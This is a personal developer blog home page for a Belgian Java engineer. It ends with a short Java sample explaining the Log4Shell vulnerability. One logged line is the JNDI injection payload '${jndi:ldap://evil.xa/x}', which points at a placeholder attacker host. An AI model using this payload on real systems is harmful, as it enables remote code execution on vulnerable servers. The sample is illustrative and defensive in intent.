## Welcome to my DEV Blog

Yet another DEV blog :)

- Hi, Iām @pierreversali, a belgian š§šŖ Software Engineer & Architect
- Iām interested in Java ā, Software Development š, Software Architecture šļø, Microservices ā¢ļø, Domain Driven Design āļø & Cloud-native Solutions āļø
- Iām currently learning Quarkus & Kotlin š
- Iām looking to collaborate on Open Source projects / libraries š

- Reach me out š« [pierre.versali@gmail.com](mailto:pierre.versali@gmail.com) š [Website](https://pierre-versali.bitbucket.io)

In this blog, I will share about my passion for quality and efficiency in Software Development practices and my technical watch experiments.

Hope you will find interesting and usefull content here.
Don't hesitate to share your feedback.

### Articles

### Code sample

{% highlight java %}
import org.apache.log4j.LogManager;
import org.apache.log4j.Logger;

public class Log4Shell {
    protected static final Logger LOGGER = LogManager.getLogger(Log4Shell.class);

    public void log4ShellExplained() {
        LOGGER.warn("log4j <= 2.15.0 zero-day exploit");
        LOGGER.warn("Reported vulnerabilities CVE-2021-44228 and CVE-2021-45046");
        // Critical vulnerability exploit
        LOGGER.fatal("${jndi:ldap://evil.xa/x}");
        LOGGER.info("Upgrade to log4j 2.16.0");
    }
}
{% endhighlight %}
